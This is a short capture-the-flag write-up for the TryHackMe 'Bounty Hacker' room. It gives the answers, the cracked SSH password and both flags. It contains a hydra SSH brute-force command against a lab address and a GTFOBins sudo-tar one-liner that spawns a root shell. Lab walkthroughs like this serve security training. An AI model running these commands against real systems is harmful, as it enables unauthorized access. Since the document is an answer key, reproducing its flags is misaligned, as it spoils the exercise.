
https://tryhackme.com/room/cowboyhacker
"You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!"


##############################
		Cosmin Tibuleac | 23.02.2022
##############################




# Task 1: Living up to the title.

1. Deploy the machine.
	`N/A`
	
2. Find open ports on the machine

	`N/A`
	
3. Who wrote the task list?

	`lin`
	
4. What service can you bruteforce with the text file found?

	`ssh`
	
5. What is the users password?

	`RedDr4gonSynd1cat3`
	
	## using hydra to find the correct ssh password: 
	
	hydra -l lin -P /root/CTF/thm/bounty_hacker/locks.txt 10.10.8.99 -t 4 ssh | tee hydra.log

**[22][ssh] host: 10.10.8.99   login: lin   password: RedDr4gonSynd1cat3**


6. user.txt

	`THM{CR1M3_SyNd1C4T3}`

7. root.txt


'sudo -l' 

*User lin may run the following commands on bountyhacker:
    (root) /bin/tar*
	

"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."

    *sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh*
  

source: 
https://gtfobins.github.io/gtfobins/tar/#sudo

` THM{80UN7Y_h4cK3r}`
	